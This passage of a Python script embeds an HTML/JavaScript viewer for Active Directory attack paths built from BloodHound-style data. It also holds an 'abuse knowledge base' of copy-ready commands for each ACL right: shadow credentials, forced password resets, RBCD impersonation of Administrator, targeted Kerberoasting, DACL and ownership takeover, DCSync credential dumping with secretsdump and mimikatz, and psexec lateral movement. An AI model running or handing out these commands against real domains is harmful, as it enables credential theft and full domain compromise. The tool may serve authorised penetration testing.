      ctx.font="11px Inter,system-ui"; ctx.textAlign="center"; ctx.textBaseline="top";
      const lbl=short(n.label); ctx.lineWidth=3; ctx.strokeStyle="rgba(5,8,14,.85)";
      ctx.strokeText(lbl,x,y+r+3); ctx.fillStyle="#dbe6f3"; ctx.fillText(lbl,x,y+r+3);}
    ctx.globalAlpha=1;
  });
}
function short(s){s=s||""; return s.length>26?s.slice(0,24)+"…":s;}
function updateCount(){const el=document.getElementById("count");
  if(el) el.textContent=visArr.length+" / "+N.length+" shown";}

// fit the visible cluster into view once it settles
let fitted=false;
function fit(){ if(!visArr.length)return;
  let x0=1e9,y0=1e9,x1=-1e9,y1=-1e9;
  visArr.forEach(i=>{const n=N[i]; x0=Math.min(x0,n.x);y0=Math.min(y0,n.y);x1=Math.max(x1,n.x);y1=Math.max(y1,n.y);});
  const w=x1-x0+160, h=y1-y0+160;
  scale=Math.max(0.25,Math.min(1.6, Math.min(W/w,(Hh)/h)));
  tx=W/2-((x0+x1)/2)*scale; ty=Hh/2-((y0+y1)/2)*scale;}

// ---- picking (visible only) ----
function pick(px,py){let best=-1,bd=1e9;
  for(const i of visArr){const [x,y]=toScreen(N[i].x,N[i].y), r=N[i].r+5;
    const d=(px-x)**2+(py-y)**2; if(d<r*r&&d<bd){bd=d;best=i;}} return best;}

// ---- interaction ----
let dragN=-1, panning=false, lastx=0,lasty=0, moved=false;
cv.addEventListener("mousedown",ev=>{const i=pick(ev.clientX,ev.clientY); moved=false;
  if(i>=0){dragN=i;N[i].fx=N[i].x;N[i].fy=N[i].y;cv.classList.add("grab");requestDraw();}
  else{panning=true;cv.classList.add("grab");} lastx=ev.clientX;lasty=ev.clientY;});
addEventListener("mousemove",ev=>{
  const dx=ev.clientX-lastx, dy=ev.clientY-lasty; if(Math.abs(dx)+Math.abs(dy)>3)moved=true;
  if(dragN>=0){const [wx,wy]=toWorld(ev.clientX,ev.clientY);N[dragN].fx=wx;N[dragN].fy=wy;N[dragN].x=wx;N[dragN].y=wy;requestDraw();}
  else if(panning){tx+=dx;ty+=dy;requestDraw();}
  else{const i=pick(ev.clientX,ev.clientY); if(i!==hover){hover=i;requestDraw();}
    const tip=document.getElementById("tip");
    if(i>=0){tip.style.display="block";tip.style.left=(ev.clientX+14)+"px";tip.style.top=(ev.clientY+14)+"px";
      tip.innerHTML="<b>"+esc(N[i].label)+"</b><br><span style='color:#9aa7b8'>"+N[i].type+" · "+deg[i]+" edges · click to expand</span>";
      cv.style.cursor="pointer";}
    else{tip.style.display="none";cv.style.cursor="";}}
  lastx=ev.clientX;lasty=ev.clientY;});
addEventListener("mouseup",ev=>{
  if(dragN>=0){
    if(!moved){select(dragN);expand(dragN);N[dragN].fx=null;N[dragN].fy=null;N[dragN].pinned=false;}
    else{N[dragN].pinned=true;N[dragN].fx=N[dragN].x;N[dragN].fy=N[dragN].y;}
    dragN=-1;cv.classList.remove("grab");requestDraw();
  }
  else if(panning){panning=false;cv.classList.remove("grab"); if(!moved){select(-1);} requestDraw();}
});
cv.addEventListener("wheel",ev=>{ev.preventDefault();const f=ev.deltaY<0?1.12:1/1.12;
  const [wx,wy]=toWorld(ev.clientX,ev.clientY); scale=Math.max(0.15,Math.min(4,scale*f));
  tx=ev.clientX-wx*scale; ty=ev.clientY-wy*scale; requestDraw();},{passive:false});
// Right-click a node → toggle owned (no menu, no file needed).
cv.addEventListener("contextmenu",ev=>{const i=pick(ev.clientX,ev.clientY);
  if(i>=0){ev.preventDefault(); toggleOwned(i);}});

// ---- selection + panel ----
function select(i){sel=i; const p=document.getElementById("panel"); requestDraw();
  if(i<0){p.classList.remove("open");return;}
  const n=N[i]; p.classList.add("open");
  document.getElementById("ptype").textContent=n.type;
  document.getElementById("pname").textContent=n.label;
  let b=""; if(n.hv)b+="<span class='badge hv'>&#9733; HIGH VALUE</span>";
  if(n.owned)b+="<span class='badge owned'>&#9760; OWNED</span>";
  b+="<span class='badge t'>"+deg[i]+" edges</span>";
  b+="<span class='badge own-toggle' id='ownbtn' title='Toggle owned (or press O / right-click the node)'>"+
     (n.owned?"&#9760; unmark owned":"&#9760; mark owned")+"</span>";
  document.getElementById("pbadges").innerHTML=b;
  const ob=document.getElementById("ownbtn"); if(ob) ob.onclick=()=>toggleOwned(i);
  renderBody(i);
}
// Mark/unmark a node as compromised, live. Owned drives the "Owned" view and the
// → Domain Admins / → DC shortest-path queries, so the operator controls the
// whole attack-path picture straight from the graph — no --owned file needed.
function toggleOwned(i){ if(i<0||i==null)return;
  N[i].owned=!N[i].owned; recomputeOwned();
  if(sel===i) select(i);              // refresh the panel badge/button
  if(curView==="owned"||curView==="da"||curView==="dc") applyView(curView);
  requestDraw();
  toast(N[i].owned?"Marked owned ☠":"Unmarked owned");
}
function renderBody(i){
  const n=N[i]; let h="";
  // outbound abusable edges
  const out=E.filter(e=>e.s===i);
  const ab=out.map(e=>abuseCard(i,e)).filter(Boolean);
  h+="<div class='sect'>&#9876; Abuse from this node</div>";
  if(ab.length) h+=ab.join("");
  else h+="<div class='empty'>No directly abusable outbound rights mapped.</div>";
  // inbound (who can pwn this)
  const inc=E.filter(e=>e.t===i && key(e.l) in ABUSE);
  if(inc.length){h+="<div class='sect'>&#9888; Who can take this over</div>";
    inc.slice(0,30).forEach(e=>{h+="<div class='edge'><span class='rt'>"+e.l+"</span> &larr; "+esc(N[e.s].label)+"</div>";});}
  // neighbors
  h+="<div class='sect'>Connections</div>";
  out.slice(0,40).forEach(e=>{h+="<div class='edge'>&rarr; <span class='rt'>"+e.l+"</span> "+esc(N[e.t].label)+"</div>";});
  document.getElementById("pbody").innerHTML=h;
  document.querySelectorAll("#pbody .cmd pre").forEach(pre=>{
    pre.addEventListener("click",()=>copy(pre.getAttribute("data-cmd")));});
}
function abuseCard(si,e){
  const k=key(e.l); const list=ABUSE[k]; if(!list||!list.length) return "";
  const src=N[si], dst=N[e.t]; const dt=(dst.type||"").toLowerCase();
  const rows=list.filter(c=>c.when==="any"||c.when===dt||(c.when==="domain"&&dt==="domain"));
  const use=rows.length?rows:list.filter(c=>c.when==="any")||list;
  if(!use.length) return "";
  let h="<div class='abuse'><div class='ah'><span class='src'>"+esc(short(src.label))+
    "</span> <span class='arrow'>&mdash;"+e.l+"&rarr;</span> <span class='dst'>"+esc(short(dst.label))+"</span></div>";
  use.forEach(c=>{const cmd=sub(c.cmd,src,dst);
    h+="<div class='cmd'><div class='ch'><span class='os "+(c.os==="win"?"win":"linux")+"'>"+
       (c.os==="win"?"WINDOWS":"LINUX")+"</span>"+esc(c.tool)+"</div>"+
       "<pre data-cmd='"+escAttr(cmd)+"'><span class='cp'>copy</span>"+esc(cmd)+"</pre></div>";});
  h+="</div>"; return h;
}
function sub(cmd,src,dst){const sN=nshort(src.label), dN=nshort(dst.label);
  return cmd.replace(/{srcN}/g,sN).replace(/{dstN}/g,dN).replace(/{dom}/g,DOMAIN)
            .replace(/{dcip}/g,DCIP).replace(/{dc}/g,DCHOST);}
function nshort(s){return (s||"").split("@")[0];}
function key(l){return (l||"").toLowerCase().replace(/[^a-z]/g,"");}
function esc(s){return (s+"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
function escAttr(s){return esc(s).replace(/'/g,"&#39;");}
let _toastT=0;
function toast(msg){const e=document.getElementById("toast"); if(!e)return; e.textContent=msg||"copied";
  e.classList.add("show"); clearTimeout(_toastT); _toastT=setTimeout(()=>e.classList.remove("show"),1100);}
function copy(t){navigator.clipboard&&navigator.clipboard.writeText(t);toast("copied");}
document.getElementById("pclose").addEventListener("click",()=>select(-1));

// ---- bring a node (or an edge's two ends) into view + select ----
function recenter(cx,cy){ scale=Math.max(scale,1.1); tx=W/2-cx*scale; ty=Hh/2-cy*scale; }
function focusNode(i){ const before=new Set(vis); vis.add(i); nb[i].forEach(j=>vis.add(j));
  const added=[...vis].filter(j=>!before.has(j)); if(added.length===vis.size) seedVisible("search"); else placeAround(i, added);
  refresh(); recenter(N[i].x,N[i].y); select(i); requestDraw(); }
function focusEdge(s,t){ const before=new Set(vis); vis.add(s); vis.add(t); nb[s].forEach(j=>vis.add(j));
  const added=[...vis].filter(j=>!before.has(j)); placeAround(s, added);
  refresh(); recenter((N[s].x+N[t].x)/2,(N[s].y+N[t].y)/2); select(s); requestDraw(); }

// ---- search across ALL nodes with a live results dropdown ----
const q=document.getElementById("q"), results=document.getElementById("results");
let matches=[], rsel=-1;
function renderResults(){
  if(!matches.length){results.classList.remove("show");results.innerHTML="";return;}
  results.innerHTML=matches.slice(0,40).map((i,k)=>{const n=N[i],c=COLORS[n.type]||COLORS.Base;
    const m=(n.owned?"☠ ":"")+(n.hv?"★ ":"");
    return "<div class='r"+(k===rsel?" sel":"")+"' data-i='"+i+"'><span class='d' style='color:"+c+"'></span>"+m+esc(n.label)+"<small>"+n.type+"</small></div>";}).join("");
  results.classList.add("show");
  results.querySelectorAll(".r").forEach(el=>el.addEventListener("mousedown",ev=>{ev.preventDefault();pickResult(+el.dataset.i);}));
}
function pickResult(i){ matches=[]; results.classList.remove("show"); q.value=N[i].label; focusNode(i); }
q.addEventListener("input",()=>{const v=q.value.toLowerCase().trim(); rsel=-1;
  if(!v){matches=[];renderResults();return;}
  matches=[]; for(let i=0;i<N.length;i++){ if((N[i].label||"").toLowerCase().includes(v)) matches.push(i); }
  matches.sort((a,b)=>{const A=(N[a].label||"").toLowerCase(),B=(N[b].label||"").toLowerCase();
    return ((A.startsWith(v)?0:1)-(B.startsWith(v)?0:1)) || (A.length-B.length);});
  renderResults();});
q.addEventListener("keydown",ev=>{
  if(ev.key==="ArrowDown"){rsel=Math.min(rsel+1,matches.length-1);renderResults();ev.preventDefault();}
  else if(ev.key==="ArrowUp"){rsel=Math.max(rsel-1,0);renderResults();ev.preventDefault();}
  else if(ev.key==="Enter"){if(matches.length)pickResult(matches[rsel<0?0:rsel]);}
  else if(ev.key==="Escape"){matches=[];renderResults();q.blur();}});
document.addEventListener("mousedown",ev=>{if(!ev.target.closest("#search")&&!ev.target.closest("#results"))results.classList.remove("show");});

// ---- findings menu: who can abuse what (+ all users) ----
const FRANK={dcsync:0,getchangesall:0,getchanges:0,genericall:1,writedacl:2,writeowner:3,owns:3,
  addkeycredentiallink:4,forcechangepassword:5,allextendedrights:6,writespn:7,addspn:7,addmember:8,addself:8,
  allowedtoact:9,allowedtodelegate:9,synclapspassword:10,adminto:20};
const FA=(()=>{const o=[];E.forEach((e,i)=>{if(key(e.l) in ABUSE)o.push(i);});
  o.sort((a,b)=>((FRANK[key(E[a].l)]??50)-(FRANK[key(E[b].l)]??50))||E[a].l.localeCompare(E[b].l));return o;})();
const findings=document.getElementById("findings"), flist=document.getElementById("flist");
const btnFind=document.getElementById("btnFind"), btnUsers=document.getElementById("btnUsers");
let fmode="";
function buildFindings(f){f=(f||"").toLowerCase();let h="",last="";
  FA.forEach(ei=>{const e=E[ei],s=N[e.s],t=N[e.t];
    if(f && !(s.label+" "+e.l+" "+t.label).toLowerCase().includes(f))return;
    if(e.l!==last){h+="<div class='fg'>"+esc(e.l)+"</div>";last=e.l;}
    h+="<div class='fi' data-s='"+e.s+"' data-t='"+e.t+"'>"+(s.owned?"☠ ":"")+"<span class='src'>"+esc(short(s.label))+"</span> <span class='rt'>&rarr;</span> <span class='dst'>"+esc(short(t.label))+"</span></div>";});
  flist.innerHTML=h||"<div class='fi' style='color:#9aa7b8'>No abusable ACL edges in this dataset.</div>";
  flist.querySelectorAll(".fi[data-s]").forEach(el=>el.addEventListener("click",()=>focusEdge(+el.dataset.s,+el.dataset.t)));}
function buildUsers(f){f=(f||"").toLowerCase();
  const us=[...N.keys()].filter(i=>N[i].type==="User").sort((a,b)=>(N[a].label||"").localeCompare(N[b].label||""));
  let h=""; us.forEach(i=>{const n=N[i]; if(f && !(n.label||"").toLowerCase().includes(f))return;
    h+="<div class='fi' data-i='"+i+"'>"+(n.owned?"<span style='color:#ff5b5b'>☠ </span>":"")+(n.hv?"<span style='color:#ffd24a'>★ </span>":"")+"<span class='src'>"+esc(n.label)+"</span></div>";});
  flist.innerHTML=h||"<div class='fi' style='color:#9aa7b8'>No users.</div>";
  flist.querySelectorAll(".fi[data-i]").forEach(el=>el.addEventListener("click",()=>focusNode(+el.dataset.i)));}
function openFindings(mode){ if(fmode===mode){closeFindings();return;}
  fmode=mode; findings.classList.add("show");
  btnFind.classList.toggle("on",mode==="find"); btnUsers.classList.toggle("on",mode==="users");
  const nUsers=N.filter(n=>n.type==="User").length;
  document.getElementById("findTitle").textContent = mode==="find"?("Abusable ACLs ("+FA.length+")"):("All users ("+nUsers+")");
  document.getElementById("ffilter").value="";
  (mode==="find"?buildFindings:buildUsers)("");}
function closeFindings(){fmode="";findings.classList.remove("show");btnFind.classList.remove("on");btnUsers.classList.remove("on");}
btnFind.addEventListener("click",()=>openFindings("find"));
btnUsers.addEventListener("click",()=>openFindings("users"));
document.getElementById("findClose").addEventListener("click",closeFindings);
document.getElementById("ffilter").addEventListener("input",e=>{(fmode==="find"?buildFindings:buildUsers)(e.target.value);});

// ---- static first paint
function warmup(){ fit(); fitted=true; requestDraw(); }

// ---- VIEW buttons (Owned · → Domain Admins · → DC · High value · Everything)
document.querySelectorAll('#dock .q').forEach(b=>b.addEventListener("click",()=>applyView(b.dataset.q)));

// ---- reset = clear back to the empty start ----
const rb=document.getElementById("reset");
if(rb) rb.addEventListener("click",()=>{ q.value=""; matches=[]; renderResults(); applyView("none"); });
addEventListener("keydown",ev=>{
  if(ev.target&&/^(INPUT|TEXTAREA)$/.test(ev.target.tagName)) return;   // don't hijack the search box
  if(ev.key==="Escape"){select(-1);closeFindings();}
  else if((ev.key==="o"||ev.key==="O") && sel>=0){ toggleOwned(sel); }   // O = mark/unmark selected
});

// ---- empty-state hint: the graph starts blank; this tells the operator how to
// populate it (search / pick a view / mark owned). Hidden as soon as nodes show.
function updateHint(){ const el=document.getElementById("empty"); if(!el)return;
  el.style.display = (visArr.length? "none":"flex"); }   // flex → keeps it centered

// ---- boot: start EMPTY. The operator drives the graph — search a node, pick a
// view, or right-click / press O to mark owned. Nothing is shown until then.
resize(); applyView("none");
</script>
</body>
</html>
'''

# --- Abuse knowledge base: Linux + Windows commands per ACL right ----------
# Placeholders: {srcN}=controlling principal (short), {dstN}=target (short),
#               {dom}=domain, {dc}=DC host/ip
ABUSE = {
 "genericall": [
  {"os":"linux","when":"user","tool":"certipy (Shadow Creds → NT hash)","cmd":"certipy shadow auto -u '{srcN}@{dom}' -p '<pass>' -account '{dstN}' -dc-ip {dcip} -target {dc}"},
  {"os":"linux","when":"user","tool":"bloodyAD (ForceChangePassword)","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} set password '{dstN}' 'Newp@ss123!'"},
  {"os":"win","when":"user","tool":"Whisker (Shadow Creds)","cmd":"Whisker.exe add /target:{dstN}"},
  {"os":"win","when":"user","tool":"PowerView (reset pwd)","cmd":"Set-DomainUserPassword -Identity {dstN} -AccountPassword (ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"},
  {"os":"linux","when":"group","tool":"bloodyAD (add self)","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add groupMember '{dstN}' '{srcN}'"},
  {"os":"win","when":"group","tool":"PowerView (add member)","cmd":"Add-DomainGroupMember -Identity '{dstN}' -Members '{srcN}'"},
  {"os":"linux","when":"computer","tool":"RBCD (impacket+bloodyAD)","cmd":"impacket-addcomputer {dom}/'{srcN}':'<pass>' -computer-name 'PWN$' -computer-pass 'Pwn123!' -dc-ip {dcip} -dc-host {dc} && bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add rbcd '{dstN}' 'PWN$' && impacket-getST -spn cifs/{dstN}.{dom} -impersonate Administrator {dom}/'PWN$':'Pwn123!' -dc-ip {dcip} -dc-host {dc}"},
  {"os":"win","when":"computer","tool":"RBCD (Powermad+Rubeus)","cmd":"New-MachineAccount -MachineAccount PWN -Password (ConvertTo-SecureString 'Pwn123!' -AsPlainText -Force); Set-ADComputer {dstN} -PrincipalsAllowedToDelegateToAccount PWN$; Rubeus.exe s4u /user:PWN$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/{dstN}.{dom} /ptt"},
 ],
 "genericwrite": [
  {"os":"linux","when":"user","tool":"certipy (Shadow Creds · Kerberos)","cmd":"KRB5CCNAME=<ticket.ccache> certipy shadow auto -u '{srcN}@{dom}' -k -no-pass -account '{dstN}' -dc-ip {dcip} -target {dc}"},
  {"os":"linux","when":"user","tool":"bloodyAD + GetUserSPNs (targeted roast · Kerberos)","cmd":"bloodyAD --host {dc} --dc-ip {dcip} -d {dom} -u '{srcN}' -k set object '{dstN}' servicePrincipalName -v 'ADAUTOPWN/{dstN}' && KRB5CCNAME=<ticket.ccache> impacket-GetUserSPNs {dom}/'{srcN}' -k -no-pass -dc-host {dc} -request-user '{dstN}' && bloodyAD --host {dc} --dc-ip {dcip} -d {dom} -u '{srcN}' -k remove object '{dstN}' servicePrincipalName -v 'ADAUTOPWN/{dstN}'"},
  {"os":"linux","when":"computer","tool":"RBCD (Kerberos, if MAQ/addcomputer works)","cmd":"KRB5CCNAME=<ticket.ccache> impacket-addcomputer {dom}/'{srcN}' -k -no-pass -dc-ip {dcip} -dc-host {dc} -computer-name 'PWN$' -computer-pass 'Pwn123!' && bloodyAD --host {dc} --dc-ip {dcip} -d {dom} -u '{srcN}' -k add rbcd '{dstN}' 'PWN$' && impacket-getST -spn cifs/{dstN}.{dom} -impersonate Administrator {dom}/'PWN$':'Pwn123!' -dc-ip {dcip} -dc-host {dc}"},
  {"os":"linux","when":"computer","tool":"certipy (Shadow Creds · Kerberos)","cmd":"KRB5CCNAME=<ticket.ccache> certipy shadow auto -u '{srcN}@{dom}' -k -no-pass -account '{dstN}' -dc-ip {dcip} -target {dc}"},
  {"os":"linux","when":"computer","tool":"bloodyAD + GetUserSPNs (targeted roast · Kerberos)","cmd":"bloodyAD --host {dc} --dc-ip {dcip} -d {dom} -u '{srcN}' -k set object '{dstN}' servicePrincipalName -v 'ADAUTOPWN/{dstN}' && KRB5CCNAME=<ticket.ccache> impacket-GetUserSPNs {dom}/'{srcN}' -k -no-pass -dc-host {dc} -request-user '{dstN}' && bloodyAD --host {dc} --dc-ip {dcip} -d {dom} -u '{srcN}' -k remove object '{dstN}' servicePrincipalName -v 'ADAUTOPWN/{dstN}'"},
  {"os":"linux","when":"any","tool":"targetedKerberoast.py (optional fallback)","cmd":"python3 targetedKerberoast.py -u '{srcN}' -p '<pass>' -d {dom} --dc-ip {dcip} --request-user '{dstN}'"},
  {"os":"win","when":"user","tool":"PowerView (set SPN → roast)","cmd":"Set-DomainObject -Identity {dstN} -Set @{{serviceprincipalname='nonexistent/ADAPwn'}}; Rubeus.exe kerberoast /user:{dstN} /nowrap"},
  {"os":"linux","when":"group","tool":"bloodyAD (add self)","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add groupMember '{dstN}' '{srcN}'"},
 ],
 "writedacl": [
  {"os":"linux","when":"any","tool":"impacket-dacledit (grant FullControl)","cmd":"impacket-dacledit -action write -rights FullControl -principal '{srcN}' -target '{dstN}' {dom}/'{srcN}':'<pass>' -dc-ip {dcip}"},
  {"os":"linux","when":"domain","tool":"bloodyAD (grant DCSync)","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add genericAll '{dstN}' '{srcN}'  # then DCSync"},
  {"os":"win","when":"any","tool":"PowerView (grant rights)","cmd":"Add-DomainObjectAcl -TargetIdentity '{dstN}' -PrincipalIdentity '{srcN}' -Rights All"},
  {"os":"win","when":"domain","tool":"PowerView (grant DCSync)","cmd":"Add-DomainObjectAcl -TargetIdentity '{dom}' -PrincipalIdentity '{srcN}' -Rights DCSync"},
 ],
 "writeowner": [
  {"os":"linux","when":"any","tool":"impacket-owneredit + dacledit","cmd":"impacket-owneredit -action write -new-owner '{srcN}' -target '{dstN}' {dom}/'{srcN}':'<pass>' -dc-ip {dcip} && impacket-dacledit -action write -rights FullControl -principal '{srcN}' -target '{dstN}' {dom}/'{srcN}':'<pass>' -dc-ip {dcip}"},
  {"os":"win","when":"any","tool":"PowerView (take ownership)","cmd":"Set-DomainObjectOwner -Identity '{dstN}' -OwnerIdentity '{srcN}'; Add-DomainObjectAcl -TargetIdentity '{dstN}' -PrincipalIdentity '{srcN}' -Rights All"},
 ],
 "owns": "writeowner",
 "addkeycredentiallink": [
  {"os":"linux","when":"any","tool":"certipy (Shadow Creds)","cmd":"certipy shadow auto -u '{srcN}@{dom}' -p '<pass>' -account '{dstN}' -dc-ip {dcip} -target {dc}"},
  {"os":"linux","when":"any","tool":"pywhisker","cmd":"pywhisker.py -d {dom} -u '{srcN}' -p '<pass>' --target '{dstN}' --action add --dc-ip {dcip}"},
  {"os":"win","when":"any","tool":"Whisker","cmd":"Whisker.exe add /target:{dstN}"},
 ],
 "forcechangepassword": [
  {"os":"linux","when":"any","tool":"bloodyAD","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} set password '{dstN}' 'Newp@ss123!'"},
  {"os":"linux","when":"any","tool":"net rpc","cmd":"net rpc password '{dstN}' 'Newp@ss123!' -U {dom}/'{srcN}'%'<pass>' -S {dc}"},
  {"os":"win","when":"any","tool":"PowerView","cmd":"Set-DomainUserPassword -Identity {dstN} -AccountPassword (ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"},
 ],
 "addmember": [
  {"os":"linux","when":"any","tool":"bloodyAD","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add groupMember '{dstN}' '{srcN}'"},
  {"os":"win","when":"any","tool":"PowerView","cmd":"Add-DomainGroupMember -Identity '{dstN}' -Members '{srcN}'"},
 ],
 "addself": "addmember",
 "allextendedrights": [
  {"os":"linux","when":"user","tool":"bloodyAD (ForceChangePassword)","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} set password '{dstN}' 'Newp@ss123!'"},
  {"os":"linux","when":"domain","tool":"impacket-secretsdump (DCSync)","cmd":"impacket-secretsdump {dom}/'{srcN}':'<pass>'@{dc} -just-dc"},
 ],
 "writespn": [
  {"os":"linux","when":"any","tool":"bloodyAD + GetUserSPNs (Kerberos)","cmd":"bloodyAD --host {dc} --dc-ip {dcip} -d {dom} -u '{srcN}' -k set object '{dstN}' servicePrincipalName -v 'ADAUTOPWN/{dstN}' && KRB5CCNAME=<ticket.ccache> impacket-GetUserSPNs {dom}/'{srcN}' -k -no-pass -dc-host {dc} -request-user '{dstN}' && bloodyAD --host {dc} --dc-ip {dcip} -d {dom} -u '{srcN}' -k remove object '{dstN}' servicePrincipalName -v 'ADAUTOPWN/{dstN}'"},
  {"os":"linux","when":"any","tool":"targetedKerberoast.py (optional fallback)","cmd":"python3 targetedKerberoast.py -u '{srcN}' -p '<pass>' -d {dom} --dc-ip {dcip} --request-user '{dstN}'"},
  {"os":"win","when":"any","tool":"PowerView+Rubeus","cmd":"Set-DomainObject -Identity {dstN} -Set @{{serviceprincipalname='nonexistent/ADAPwn'}}; Rubeus.exe kerberoast /user:{dstN} /nowrap"},
 ],
 "addspn": "writespn",
 "allowedtoact": [
  {"os":"linux","when":"any","tool":"impacket-getST (RBCD)","cmd":"impacket-getST -spn cifs/{dstN}.{dom} -impersonate Administrator {dom}/'{srcN}':'<pass>' -dc-ip {dcip} -dc-host {dc}"},
  {"os":"win","when":"any","tool":"Rubeus s4u","cmd":"Rubeus.exe s4u /user:{srcN} /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/{dstN}.{dom} /ptt"},
 ],
 "allowedtodelegate": [
  {"os":"linux","when":"any","tool":"impacket-getST (constrained deleg)","cmd":"impacket-getST -spn cifs/{dstN}.{dom} -impersonate Administrator {dom}/'{srcN}':'<pass>' -dc-ip {dcip} -dc-host {dc}"},
 ],
 "dcsync": [
  {"os":"linux","when":"any","tool":"impacket-secretsdump","cmd":"impacket-secretsdump {dom}/'{srcN}':'<pass>'@{dc} -just-dc"},
  {"os":"win","when":"any","tool":"mimikatz","cmd":"lsadump::dcsync /domain:{dom} /user:Administrator"},
 ],
 "getchanges": "dcsync",
 "getchangesall": "dcsync",
 "synclapspassword": [
  {"os":"linux","when":"any","tool":"netexec (read LAPS)","cmd":"nxc ldap {dc} -u '{srcN}' -p '<pass>' --module laps"},
 ],
 "adminto": [
  {"os":"linux","when":"any","tool":"evil-winrm / psexec","cmd":"impacket-psexec {dom}/'{srcN}':'<pass>'@{dstN}.{dom}   # or: evil-winrm -i {dstN} -u {srcN} -p '<pass>'"},
  {"os":"win","when":"any","tool":"PsExec","cmd":"PsExec.exe \\\\{dstN} cmd"},
 ],
}
# resolve string aliases
for k,v in list(ABUSE.items()):
    if isinstance(v,str): ABUSE[k]=ABUSE.get(v,[])

def write_html(payload, meta):
    tpl = HTML_TEMPLATE
    tpl = tpl.replace("__DATA__", json.dumps(payload))
    tpl = tpl.replace("__ABUSE__", json.dumps(ABUSE))
    tpl = tpl.replace("__DOMAIN__", json.dumps(DOM))
    tpl = tpl.replace("__DC__", json.dumps(DC))
    tpl = tpl.replace("__DCIP__", json.dumps(DCIP))
    tpl = tpl.replace("__META__", json.dumps(meta))
    with open(HTML,"w") as f: f.write(tpl)

# ---- load zip -------------------------------------------------------------
files = {}
if ZIP and os.path.exists(ZIP):
    try:
        with zipfile.ZipFile(ZIP) as z:
            for n in z.namelist():
                if n.lower().endswith(".json"):
                    try: files[n] = json.load(z.open(n))
                    except Exception: pass
    except Exception: files = {}

# auto-derive the domain from the zip when it wasn't supplied (standalone mode)
if DOM in ("domain.local","domain",""):
    for _n,_d in files.items():
        if "domains" in _n.lower():
            _data=_d.get("data") if isinstance(_d,dict) else _d
            if isinstance(_data,list) and _data:
                _p=_data[0].get("Properties") or {}
                if _p.get("name"): DOM=_p["name"]; break

def all_records():
    for name, doc in files.items():
        data = doc.get("data") if isinstance(doc, dict) else doc
        meta = doc.get("meta",{}) if isinstance(doc, dict) else {}
        t = (meta or {}).get("type","")
        if isinstance(data, list):
            for r in data: yield t, r

nodes = {}
edges = []
HVNAME = ["DOMAIN ADMINS","ENTERPRISE ADMINS","ADMINISTRATORS","DOMAIN CONTROLLERS",
          "SCHEMA ADMINS","ACCOUNT OPERATORS","BACKUP OPERATORS","KEY ADMINS",
          "ENTERPRISE KEY ADMINS","SERVER OPERATORS","PRINT OPERATORS","KRBTGT"]

def add_node(sid, label, ntype, hv=False):
    if not sid: return
    n = nodes.get(sid)
    if n is None:
        nodes[sid] = {"id":sid,"label":label or sid,"type":ntype or "Base","hv":bool(hv),"owned":False}
    else:
        if label and n["label"]==sid: n["label"]=label
        if hv: n["hv"]=True
        if ntype and n["type"]=="Base": n["type"]=ntype

def P(r): return r.get("Properties") or {}

TYPEMAP = {"users":"User","groups":"Group","computers":"Computer","domains":"Domain",
           "gpos":"GPO","ous":"OU","containers":"Container"}

for t, r in all_records():
    nt = TYPEMAP.get(t,"Base")
    p = P(r); sid = r.get("ObjectIdentifier")
    name = p.get("name") or p.get("distinguishedname") or sid
    hv = bool(p.get("highvalue", False))
    if nt=="Group" and any(k in (name or "").upper() for k in HVNAME): hv=True
    if nt=="Domain": hv=True
    add_node(sid, name, nt, hv)

def ensure(sid, t="Base"):
    if sid and sid not in nodes:
        add_node(sid, sid, TYPEMAP.get((t or "").lower()+"s", t if t else "Base"))

for t, r in all_records():
    sid = r.get("ObjectIdentifier")
    if not sid: continue
    for ace in (r.get("Aces") or []):
        ps = ace.get("PrincipalSID"); rn = ace.get("RightName") or "ACE"
        if not ps: continue
        ensure(ps, ace.get("PrincipalType","Base")); edges.append([ps, sid, rn])
    for m in (r.get("Members") or []):
        mid = m.get("ObjectIdentifier")
        if mid: ensure(mid, m.get("ObjectType","Base")); edges.append([mid, sid, "MemberOf"])
    for a in (r.get("AllowedToAct") or []):
        aid = a.get("ObjectIdentifier") if isinstance(a,dict) else a
        if aid: ensure(aid); edges.append([aid, sid, "AllowedToAct"])
    la = r.get("LocalAdmins") or {}
    res = la.get("Results") if isinstance(la, dict) else la
    for a in (res or []):
        aid = a.get("ObjectIdentifier") if isinstance(a,dict) else a
        if aid: ensure(aid); edges.append([aid, sid, "AdminTo"])
    for a in (r.get("AllowedToDelegate") or []):
        aid = a.get("ObjectIdentifier") if isinstance(a,dict) else a
        if aid: ensure(aid); edges.append([sid, aid, "AllowedToDelegate"])

# ---- owned (compromised) nodes from valid_creds_map.txt -------------------
owned = set()
if OWNED and os.path.exists(OWNED):
    for line in open(OWNED, errors="ignore"):
        tok = line.strip().split()
        if tok:
            u = tok[0].split(":")[0].split("@")[0].upper()
            if u: owned.add(u)
name2sid = {}
for sid,n in nodes.items():
    lbl=(n["label"] or "").upper()
    name2sid.setdefault(lbl, sid); name2sid.setdefault(lbl.split("@")[0], sid)
for u in owned:
    for cand in (u, u+"@"+DOM.upper()):
        if cand in name2sid: nodes[name2sid[cand]]["owned"]=True; break

# ---- attack paths: BFS owned → high-value, mark edges ---------------------
adj = defaultdict(list)
for i,(s,t,l) in enumerate(edges): adj[s].append((t,i))
hv = {sid for sid,n in nodes.items() if n["hv"]}
onpath_e=set(); onpath_n=set()
def bfs(start):
    if start not in nodes: return
    prev={start:None}; pe={}; q=deque([start]); tgt=None
    while q:
        u=q.popleft()
        if u in hv and u!=start: tgt=u; break
        for v,ei in adj.get(u,[]):
            if v not in prev: prev[v]=u; pe[v]=ei; q.append(v)
    if tgt:
        nd=tgt
        while prev[nd] is not None:
            onpath_e.add(pe[nd]); onpath_n.add(nd); nd=prev[nd]
        onpath_n.add(start)
